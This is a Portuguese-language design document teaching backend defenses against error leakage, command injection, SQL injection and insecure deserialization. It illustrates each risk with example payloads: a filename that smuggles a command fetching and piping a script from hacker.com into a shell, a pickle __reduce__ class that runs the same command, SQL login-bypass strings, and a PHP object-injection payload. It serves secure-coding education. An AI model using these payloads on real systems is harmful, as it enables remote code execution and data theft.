# SOFTWARE DESIGN DOCUMENT (SDD)

## Segurança Backend Avançada — Reporte de Erros, Execução de Comandos, SQL Injection e Serialização Insegura

| Campo                | Valor                                                        |
|----------------------|--------------------------------------------------------------|
| **Título**           | Segurança Backend Avançada: Reporte de Erros, Execução de Comandos, SQL Injection e Serialização Insegura |
| **Versão**           | 1.0                                                          |
| **Data**             | 2026-04-08                                                   |
| **Classificação**    | Confidencial                                                 |
| **Autor**            | Baseado no curso "Segurança Para Devs"                       |

---

## 1. Introdução

### 1.1 Propósito

Este documento descreve o design de segurança para vulnerabilidades críticas no backend que envolvem o ecossistema ao redor da aplicação: reporte de erros, execução de comandos do sistema operacional, injeção SQL e serialização/desserialização insegura de objetos.

### 1.2 Escopo

- Reporte de erros em produção: vazamento de informações técnicas via stack traces
- Execução de comandos do sistema operacional: command injection via `os.system`, `shell_exec`, etc.
- SQL Injection: construção de queries via concatenação de strings
- Serialização insegura: pickle (Python), serialize (PHP), java.io — desserialização de objetos maliciosos
- Validação de entradas como camada de defesa em profundidade

### 1.3 Definições e Acrônimos

| Termo                    | Definição                                                        |
|--------------------------|------------------------------------------------------------------|
| **Stack Trace**           | Pilha de execução que mostra o caminho do erro até a origem     |
| **Command Injection**     | Injeção de comandos do sistema operacional via input do usuário  |
| **SQL Injection**         | Injeção de código SQL via input do usuário em queries construídas por concatenação |
| **Prepared Statement**    | Query pré-compilada com placeholders — previne SQL Injection      |
| **Serialização**          | Conversão de objetos em memória para formato persistível         |
| **Desserialização**       | Conversão de dados persistidos de volta para objetos em memória  |
| **`__reduce__`**         | Método Python chamado durante `pickle.loads()` para reconstruir objetos |
| **CSPRNG**               | Cryptographically Secure Pseudo-Random Number Generator          |

### 1.4 Princípio Fundamental

> **Segurança é feita em camadas.** Validar entradas do usuário é como trancar a porta do apartamento — mesmo que o porteiro (outras camadas) falhe, a defesa adicional pode impedir ou dificultar o ataque. Valide absolutamente tudo que vem do usuário: campos de formulário, cookies, headers HTTP, nomes de arquivo, query strings.

---

## 2. Visão Geral de Arquitetura

### 2.1 Camadas de Defesa

```
┌──────────────────────────────────────────────────────────────────────┐
│                    CAMADAS DE DEFESA EM PROFUNDIDADE                │
│                                                                      │
│  Camada 1 — VALIDAÇÃO DE ENTRADA                                    │
│  ├── Campos de formulário (email, senha, nome, etc.)               │
│  ├── Cookies (tema, preferências, token)                           │
│  ├── Headers HTTP (User-Agent, Authorization, etc.)                 │
│  ├── Query strings (?next=, ?page=, ?env=)                          │
│  └── Nomes de arquivo (uploads, filenames)                          │
│                                                                      │
│  Camada 2 — SANITIZAÇÃO NO PONTO DE USO                             │
│  ├── Prepared Statements (SQL)                                      │
│  ├── Escapamento de HTML (output)                                   │
│  ├── CSPRNG para nomes de arquivo gerados                           │
│  └── Validação rigorosa para comandos do SO                         │
│                                                                      │
│  Camada 3 — CONFIGURAÇÃO DO AMBIENTE                                │
│  ├── Modo de produção (sem stack traces visíveis)                   │
│  ├── Logs estruturados (não visíveis ao usuário)                    │
│  ├── Permissões mínimas do processo                                 │
│  └── Serialização nunca exposta externamente                        │
│                                                                      │
│  ⚠️  Se uma camada falhar, as outras ainda protegem                 │
└──────────────────────────────────────────────────────────────────────┘
```

### 2.2 Superfícies de Ataque — Entradas do Usuário

```
┌──────────────────────────────────────────────────────────────────────┐
│  TUDO QUE VEM DO USUÁRIO PRECISA SER VALIDADO                       │
│                                                                      │
│  ┌──────────────────┐  ┌──────────────────┐  ┌──────────────────┐  │
│  │  FORMULÁRIOS     │  │  COOKIES         │  │  HEADERS HTTP    │  │
│  │  • E-mail        │  │  • Tema          │  │  • User-Agent    │  │
│  │  • Senha         │  │  • Preferências  │  │  • Authorization │  │
│  │  • Upload        │  │  • Session ID    │  │  • Referer       │  │
│  └──────────────────┘  └──────────────────┘  └──────────────────┘  │
│                                                                      │
│  ┌──────────────────┐  ┌──────────────────┐  ┌──────────────────┐  │
│  │  QUERY STRINGS   │  │  NOMES DE ARQ.   │  │  DADOS SERIALIZ. │  │
│  │  • ?next=        │  │  • Filename      │  │  • Pickle         │  │
│  │  • ?page=        │  │  • Path          │  │  • PHP serialize  │  │
│  │  • ?env=         │  │  • Extension     │  │  • Java IO        │  │
│  └──────────────────┘  └──────────────────┘  └──────────────────┘  │
│                                                                      │
│  ⚠️  Se o usuário pode manipular, precisa validar                    │
└──────────────────────────────────────────────────────────────────────┘
```

---

## 3. Componentes de Design

### 3.1 Componente: Reporte de Erros em Produção

#### 3.1.1 Descrição

Em modo de desenvolvimento, frameworks exibem stack traces completos com informações detalhadas sobre erros. Em produção, essas informações devem ir para logs internos, não para a tela do usuário. Stack traces vazam caminhos de arquivo, versões de software, estrutura do código e informações do sistema operacional.

#### 3.1.2 Informações Vazadas em Stack Traces

| Informação                  | Risco                                                          |
|-----------------------------|----------------------------------------------------------------|
| Caminho absoluto dos arquivos | Revela estrutura do servidor e nome do desenvolvedor         |
| Versão do framework/linguagem | Permite buscar vulnerabilidades conhecidas da versão          |
| Código-fonte da aplicação    | Expõe lógica de negócio e possíveis pontos de ataque          |
| Stack trace completo         | Mostra a cadeia de chamadas e arquivos envolvidos             |
| Informações do SO            | Versão do Linux, arquitetura do processador, hostname         |

#### 3.1.3 Código Vulnerável vs. Seguro

```ruby
# ❌ VULNERÁVEL — Modo de desenvolvimento em produção
# Rails: exibe versão, stack trace, código-fonte, caminhos absolutos
rails server
# → Stack trace completo visível no navegador

# ✅ SEGURO — Modo de produção
rails server -e production
# → Mensagem genérica no navegador
# → Stack trace completo nos logs do servidor
```

```php
# ❌ VULNERÁVEL — PHP com exibição de erros
// (padrão): display_errors = On, error_reporting = E_ALL
// Mostra: caminho, nome do arquivo, número da linha, stack trace

# ✅ SEGURO — PHP configurado para produção (php.ini)
display_errors = Off
error_reporting = 0
log_errors = On
; Erros vão para o log do servidor, não para a tela
```

```python
# ✅ SEGURO — Flask em produção
# Usar Gunicorn/uWSGI em produção (não flask run)
# Configurar logging para arquivo
import logging
logging.basicConfig(filename='/var/log/app/errors.log', level=logging.ERROR)
```

#### 3.1.4 Regras

| ID   | Regra                                                                    | Severidade |
|------|--------------------------------------------------------------------------|------------|
| ER-1 | Nunca rode aplicação em modo de desenvolvimento em produção              | Crítica    |
| ER-2 | Stack traces devem ir para logs, não para a tela do usuário              | Crítica    |
| ER-3 | Mensagens de erro para o usuário devem ser genéricas                    | Alta       |
| ER-4 | APIs devem retornar mensagens genéricas, sem detalhes técnicos          | Alta       |
| ER-5 | Garanta que logs de erro estão sendo salvos em local acessível           | Média      |
| ER-6 | Teste manualmente: acesse uma URL que cause erro e verifique a saída    | Alta       |

---

### 3.2 Componente: Execução de Comandos do Sistema Operacional (Command Injection)

#### 3.2.1 Descrição

Quando a aplicação executa comandos do sistema operacional (`os.system`, `subprocess`, `shell_exec`, `exec`), qualquer input do usuário incorporado na linha de comando pode resultar em execução arbitrária de código (RCE). Caracteres como `;`, `&&`, `|`, `$()`, `` ` `` permitem encadear comandos maliciosos.

#### 3.2.2 Código Vulnerável

```python
# ❌ CRÍTICO — Filename do usuário vai para linha de comando
@app.route('/upload', methods=['POST'])
def upload():
    file = request.files['file']
    filename = file.filename  # ← Input do usuário!

    # Salva com o nome original
    file.save(f'original/{filename}')

    # Executa comando do SO com o filename do usuário
    os.system(f'svgo original/{filename} -o optimized/{filename}')
    #                                ↑ ATAQUE: filename = "file.svg; curl http://hacker.com/script.sh | sh"
```

```
Ataque:
  filename = "logo.svg; date > hacker.txt"
  
  Comando executado:
    svgo original/logo.svg; date > hacker.txt -o optimized/logo.svg; date > hacker.txt
                                ↑───────────────────↑
                            Comando arbitrário executado

  Variantes de separadores:
    ;     → executa próximo comando
    &&    → executa se o anterior suceder
    |     → pipe para próximo comando
    ||    → executa se o anterior falhar
    $(cmd)→ substituição de comando
    `cmd` → substituição de comando (backtick)
```

#### 3.2.3 Código Seguro

```python
# ✅ ALTERNATIVA 1 — Gerar nome seguro com CSPRNG (melhor)
import secrets

@app.route('/upload', methods=['POST'])
def upload():
    file = request.files['file']
    # Nome gerado pela aplicação, nunca do usuário
    filename = secrets.token_hex(8) + '.svg'

    file.save(f'original/{filename}')
    os.system(f'svgo original/{filename} -o optimized/{filename}')
    # → filename = "c5a8f3e2.svg" — seguro para linha de comando

# ✅ ALTERNATIVA 2 — Validação rigorosa se necessário usar input do usuário
import re

@app.route('/upload', methods=['POST'])
def upload():
    file = request.files['file']
    filename = file.filename

    # Validação extrema: apenas alfanumérico e underline
    if not re.match(r'^\w+$', filename):
        return "Invalid filename", 400
    # ↑ Bloqueia: ;, &, |, $, `, (, ), espaço, /, \, etc.
```

#### 3.2.4 Regras

| ID   | Regra                                                                    | Severidade |
|------|--------------------------------------------------------------------------|------------|
| CI-1 | Nunca passe input do usuário diretamente para comandos do SO            | Crítica    |
| CI-2 | Prefira bibliotecas nativas em vez de `os.system` / `shell_exec`        | Alta       |
| CI-3 | Se precisar executar comando, gere nomes com CSPRNG (`secrets.token_hex`) | Alta       |
| CI-4 | Se obrigado a usar input do usuário, valide com regex extremamente restritiva (`/^\w+$/`) | Crítica    |
| CI-5 | Bloqueie TODOS os caracteres especiais: `; & | $ ` ( ) espaço / \ .` | Crítica    |
| CI-6 | Transforme input do usuário: hash, hex, base64 — antes de usar no comando | Alta       |

---

### 3.3 Componente: SQL Injection

#### 3.3.1 Descrição

Construção de queries SQL via concatenação de strings com input do usuário permite injeção de código SQL arbitrário. Pode resultar em bypass de autenticação, exfiltração de dados, modificação de registros e destruição do banco de dados.

#### 3.3.2 Código Vulnerável

```python
# ❌ CRÍTICO — Query construída por concatenação
email = request.form.get('email')
password = request.form.get('password')

query = f"SELECT * FROM users WHERE email='{email}' AND password='{password}'"
#                                                  ↑───────↑             ↑─────────↑
#                                                  Input do usuário     Input do usuário

user = query_db(query)
```

```
Ataques:
  email    = "' OR 1=1 --"
  password = "qualquer_coisa"

  Query resultante:
    SELECT * FROM users WHERE email='' OR 1=1 --' AND password='qualquer_coisa'
                                       ↑─────────↑
                                   Condição sempre verdadeira

  Variante mais simples:
    email = "admin' --"

  Query resultante:
    SELECT * FROM users WHERE email='admin' --' AND password='...'
                                      ↑────↑
                                   Ignora validação de senha
```

#### 3.3.3 Código Seguro

```python
# ✅ SEGURO — Prepared Statement (Parameterized Query)
email = request.form.get('email')
password = request.form.get('password')

# A biblioteca de SQL cuida de todo o escape
query = "SELECT * FROM users WHERE email=? AND password=?"
user = query_db(query, (email, password))
```

```python
# ✅ CAMADA ADICIONAL — Validação do input (defesa em profundidade)
import re

email = request.form.get('email')
password = request.form.get('password')

# Validação de e-mail antes da query
if not re.match(r'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$', email):
    return "Invalid email", 400

# Validação de comprimento da senha
if len(password) < 1 or len(password) > 128:
    return "Invalid password", 400

# Mesmo com validação, SEMPRE use prepared statements
query = "SELECT * FROM users WHERE email=? AND password=?"
user = query_db(query, (email, password))
```

#### 3.3.4 Regras

| ID   | Regra                                                                    | Severidade |
|------|--------------------------------------------------------------------------|------------|
| SI-1 | Sempre use prepared statements / parameterized queries                  | Crítica    |
| SI-2 | Nunca construa queries por concatenação de strings                      | Crítica    |
| SI-3 | Nunca tente escapar manualmente — use a biblioteca de SQL               | Alta       |
| SI-4 | Valide formato de inputs como camada adicional (email, comprimento, etc.) | Alta       |
| SI-5 | Valide cookies, headers e query strings também — não apenas formulários  | Alta       |
| SI-6 | Nunca armazene senhas em texto puro — sempre use hash (Argon2, bcrypt)   | Crítica    |

---

### 3.4 Componente: Serialização Insegura (Insecure Deserialization)

#### 3.4.1 Descrição

Serialização converte objetos em memória para formato persistível. Linguagens como Python (pickle), PHP (serialize) e Java (ObjectInputStream) permitem serializar objetos completos com classes, métodos e estado. Se um atacante conseguir substituir o dados serializado, a desserialização pode executar código arbitrário (RCE), instanciar classes internas ou vazar dados sensíveis.

#### 3.4.2 Python — pickle (RCE via `__reduce__`)

```
Mecanismo de ataque:
  1. Classe maliciosa define __reduce__ que retorna (funcao, argumentos)
  2. pickle.dumps() serializa o objeto
  3. Atacante substitui o arquivo .pkl no banco de dados / S3 / rede
  4. pickle.loads() na aplicação legítima executa __reduce__
  5. Comando arbitrário do SO é executado
```

```python
# ❌ CRÍTICO — Desserialização de pickle não confiável
import pickle

# A aplicação carrega um arquivo .pkl de um local externo
with open('arquivo.pkl', 'rb') as f:
    arquivo = pickle.load(f)  # → EXECUTA __reduce__ se o payload foi manipulado

# Mesmo que falhe a desserialização (classe não encontrada),
# o código em __reduce__ JÁ FOI EXECUTADO durante a tentativa
```

```python
# Classe maliciosa criada pelo atacante:
class Arquivo:
    def __reduce__(self):
        # Retorna (função, argumentos) — pickle executa: os.system("malicious_code")
        return (os.system, ('curl http://hacker.com/script.sh | sh',))
```

#### 3.4.3 PHP — serialize (Vazamento de dados via instânciação de classe)

```php
// Payload malicioso armazenado no banco de dados:
// O:6:"Config":0:{} — Cria instância da classe Config
// Classe Config tem propriedades públicas com dados sensíveis
// (connection string, API keys, variáveis de ambiente)

$content = unserialize(file_get_contents('content.txt'));

// O foreach trata o objeto como array e expõe todas as propriedades públicas
foreach ($content as $key => $value) {
    echo "$key: $value\n";
    // Saída: db_host: localhost, api_key: AKIA..., secret: xxx
}
```

```
Formato PHP serialize:
  a:3:{...}        → Array com 3 elementos
  s:6:"titulo"     → String de 6 caracteres
  O:6:"Config":0:{}→ Objeto da classe Config, 0 propriedades no payload
                    → Mas o construtor da classe Config carrega
                      variáveis de ambiente e configurações internas!
```

#### 3.4.4 Regras

| ID   | Regra                                                                    | Severidade |
|------|--------------------------------------------------------------------------|------------|
| DS-1 | Prefira NÃO usar serialização — use JSON para dados em trânsito          | Crítica    |
| DS-2 | Se usar serialização, NEVER exponha dados serializados externamente     | Crítica    |
| DS-3 | Nunca salve dados serializados no S3, banco de dados compartilhado ou rede | Crítica    |
| DS-4 | Serialize/deserialize deve acontecer apenas dentro do ecossistema seguro | Crítica    |
| DS-5 | Nunca desserialize dados que vieram do usuário ou de fonte não confiável | Crítica    |
| DS-6 | Python: nunca use `pickle.loads()` com dados externos                    | Crítica    |
| DS-7 | PHP: nunca use `unserialize()` com dados do banco de dados/rede          | Crítica    |
| DS-8 | JSON só serializa dados (string, number, boolean, null, object, array) — não executa código | Alta |

---

## 4. Matriz de Ameaças e Mitigações

| # | Ameaça                                | Vetor de Entrada          | Impacto                           | Mitigação                                      | Ref. |
|---|---------------------------------------|---------------------------|-----------------------------------|------------------------------------------------|------|
| 1 | Vazamento de stack trace              | Erro em produção          | Revela versões, caminhos, código  | Modo de produção + logs internos               | 3.1  |
| 2 | Vazamento de versões do software      | Stack trace               | Busca de exploits por versão      | Modo de produção                               | 3.1  |
| 3 | Command Injection — RCE               | Filename no `os.system`   | Takeover completo do servidor     | CSPRNG para nomes / não usar input do usuário   | 3.2  |
| 4 | Command Injection via separadores     | `; && | $()` no filename | Execução de código arbitrário   | Regex `/^\w+$/` para validação                 | 3.2  |
| 5 | SQL Injection — bypass de autenticação| E-mail com `' OR 1=1`    | Acesso não autorizado            | Prepared statements                            | 3.3  |
| 6 | SQL Injection — destruição de dados   | Cookie com `'; DROP TABLE`| Perda de dados                    | Prepared statements + validação de cookies      | 3.3  |
| 7 | SQL Injection via header              | User-Agent com `'; DROP`  | Perda de dados                    | Validar todos os headers HTTP                   | 3.3  |
| 8 | RCE via pickle `__reduce__`           | Arquivo .pkl manipulado   | Execução de código no servidor    | Nunca desserializar dados externos com pickle   | 3.4  |
| 9 | Vazamento de dados via PHP serialize  | Payload com `O:6:"Config"`| API keys, credenciais expostas    | Nunca usar unserialize com dados externos       | 3.4  |
| 10| Instanciação de classe arbitrária     | PHP object injection       | Acesso a dados internos           | Nunca desserializar dados do banco de dados     | 3.4  |

---

## 5. Checklists de Verificação

### 5.1 Checklist Geral — Backend Security

- [ ] Aplicação roda em modo de produção (sem stack traces visíveis)
- [ ] Erros em produção exibem mensagem genérica para o usuário
- [ ] Stack traces vão para logs internos acessíveis apenas ao time de desenvolvimento
- [ ] Nenhum comando do sistema operacional recebe input do usuário diretamente
- [ ] Nomes de arquivo para comandos do SO são gerados com CSPRNG
- [ ] Se input do usuário vai para comando do SO, validado com regex `/^\w+$/`
- [ ] Todas as queries SQL usam prepared statements / parameterized queries
- [ ] Nenhuma query SQL é construída por concatenação de strings
- [ ] E-mails são validados por formato antes de chegar à query
- [ ] Cookies são validados antes de serem usados em queries ou comandos
- [ ] Headers HTTP são validados antes de serem persistidos no banco
- [ ] Senhas são armazenadas com hash (Argon2, bcrypt), nunca em texto puro
- [ ] Serialização nativa (pickle, PHP serialize) nunca é exposta externamente
- [ ] Dados serializados nunca são armazenados no banco de dados compartilhado, S3 ou rede
- [ ] JSON é usado como formato de dados para qualquer transferência pela rede

### 5.2 Checklist — Validação de Entradas (Defesa em Profundidade)

- [ ] Campos de formulário são validados (tipo, formato, comprimento)
- [ ] Cookies são validados (valores esperados, formato)
- [ ] Headers HTTP são validados (User-Agent, Authorization, etc.)
- [ ] Query strings são validadas (?next=, ?page=, ?env=)
- [ ] Nomes de arquivo em uploads são validados e/ou substituídos por nomes CSPRNG
- [ ] Validação de e-mail com regex antes de qualquer uso
- [ ] Validação de comprimento para senhas e outros campos textuais
- [ ] Validação de tipo de dado recebido em APIs (string, int, boolean)

### 5.3 Checklist — Teste de Produção

- [ ] Acesse uma URL que cause erro 500 — verifique se stack trace NÃO é visível
- [ ] Verifique logs do servidor — stack traces devem estar nos logs
- [ ] Teste com filename malicioso no upload — deve ser bloqueado ou ignorado
- [ ] Teste SQL injection nos campos de login — deve ser bloqueado
- [ ] Teste com cookie contendo aspas simples — deve ser tratado com segurança
- [ ] Teste com header User-Agent contendo código SQL — deve ser tratado com segurança

---

## 6. Tabela Comparativa — Formatos de Serialização

| Formato              | Executa Código? | Serializa Métodos? | Seguro para Rede? | Uso Recomendado       |
|----------------------|-----------------|--------------------|--------------------|------------------------|
| **JSON**             | Não             | Não                | ✅ Sim             | Dados em trânsito      |
| **XML**              | Não             | Não                | ✅ Sim             | Dados em trânsito      |
| **Python pickle**    | ✅ Sim           | ✅ Sim              | ❌ Não             | Apenas interno, nunca externo |
| **PHP serialize**    | ✅ Sim (obj)     | ✅ Sim              | ❌ Não             | Nunca usar             |
| **Java ObjectInput** | ✅ Sim           | ✅ Sim              | ❌ Não             | Apenas interno, nunca externo |
| **MessagePack**      | Não             | Não                | ✅ Sim             | Dados em trânsito      |
| **Protocol Buffers** | Não             | Não                | ✅ Sim             | Dados em trânsito      |

---

## 7. Referências

| Recurso                      | URL/Descrição                                             |
|------------------------------|-----------------------------------------------------------|
| OWASP — Command Injection     | https://owasp.org/www-community/attacks/Command_Injection |
| OWASP — SQL Injection         | https://owasp.org/www-community/attacks/SQL_Injection     |
| OWASP — Insecure Deserialization | https://owasp.org/www-community/attacks/Insecure_Deserialization |
| CWE-502 — Deserialization of Untrusted Data | https://cwe.mitre.org/data/definitions/502.html |
| CWE-89 — SQL Injection        | https://cwe.mitre.org/data/definitions/89.html           |
| CWE-78 — OS Command Injection | https://cwe.mitre.org/data/definitions/78.html           |
| CWE-209 — Error Message Information Exposure | https://cwe.mitre.org/data/definitions/209.html |
| Python secrets module         | https://docs.python.org/3/library/secrets.html             |
| Python pickle documentation   | https://docs.python.org/3/library/pickle.html              |
